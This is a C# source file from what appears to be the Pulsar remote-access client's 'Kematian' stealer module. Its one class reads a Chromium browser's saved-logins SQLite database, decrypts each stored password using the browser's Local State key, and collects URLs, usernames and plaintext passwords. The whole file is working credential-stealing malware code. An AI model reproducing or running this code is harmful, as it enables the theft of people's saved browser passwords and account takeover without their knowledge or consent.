﻿using Pulsar.Client.Kematian.Browsers.Helpers.SQL;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using Pulsar.Client.Kematian.HelpingMethods.Decryption;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;


namespace Pulsar.Client.Kematian.Browsers.Chromium.Passwords
{
    public class PasswordsChromium
    {
        public static List<LoginData> GetLogins(string loginPath, string localstate)
        {
            var decrypter = new ChromiumDecryptor(localstate);
            var logins = new List<LoginData>();
            if (File.Exists(loginPath))
            {
                SQLiteHandler sqlDatabase;
                try
                {
                    sqlDatabase = new SQLiteHandler(loginPath);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Failed to open SQLite database: {ex.Message}");
                    return logins;
                }
                if (!sqlDatabase.ReadTable("logins"))
                {
                    Debug.WriteLine("Failed to read 'logins' table from database.");
                    return logins;
                }
                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    try
                    {
                        var url = sqlDatabase.GetValue(i, "origin_url");
                        var username = sqlDatabase.GetValue(i, "username_value");
                        var password = decrypter.Decrypt(sqlDatabase.GetValue(i, "password_value"));

                        if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
                            continue;

                        logins.Add(new LoginData(url, username, password));
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Failed to retrieve cookie data from database: {ex.Message}");
                    }
                }
            }
            else
            {
                Debug.WriteLine("Database file not found.");
            }
            return logins;
        }
    }
}
